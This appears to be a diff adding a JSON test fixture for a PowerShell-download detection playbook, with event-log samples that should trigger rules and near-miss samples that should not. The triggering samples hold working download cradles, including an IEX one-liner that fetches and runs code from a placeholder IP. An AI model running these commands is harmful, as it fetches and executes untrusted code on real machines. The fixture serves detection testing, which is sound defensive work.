@@ -1,0 +1,117 @@
+{
+ "playbook": "signal_powershell_download",
+ "fires": [
+  {
+   "rule": "PowerShell DownloadString",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell -c (New-Object Net.WebClient).DownloadString('https://203.0.113.7/s.ps1') | Out-File s.ps1",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "PowerShell DownloadFile",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell -c (New-Object Net.WebClient).DownloadFile('http://203.0.113.7/a.exe','C:\\Users\\Public\\a.exe')",
+      "User": "CORP\\alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "PowerShell Invoke-WebRequest",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell -c iwr http://203.0.113.7/a.exe -OutFile C:\\Users\\Public\\a.exe",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "PowerShell IEX Download Cradle",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/a')\"",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "PowerShell Start-BitsTransfer",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell Start-BitsTransfer -Source http://203.0.113.7/a.exe -Destination C:\\Users\\Public\\a.exe",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "Script Block Download",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4104,
+      "windows.channel": "Microsoft-Windows-PowerShell/Operational",
+      "ScriptBlockText": "$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.7/a')",
+      "ScriptBlockId": "5b1c"
+     }
+    }
+   ]
+  }
+ ],
+ "near_miss": [
+  {
+   "name": "local web request to an internal API",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell -c Get-Process | ConvertTo-Json",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "name": "script block without a download",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4104,
+      "windows.channel": "Microsoft-Windows-PowerShell/Operational",
+      "ScriptBlockText": "Get-ChildItem C:\\Logs | Remove-Item",
+      "ScriptBlockId": "7a2d"
+     }
+    }
+   ]
+  }
+ ]
+}
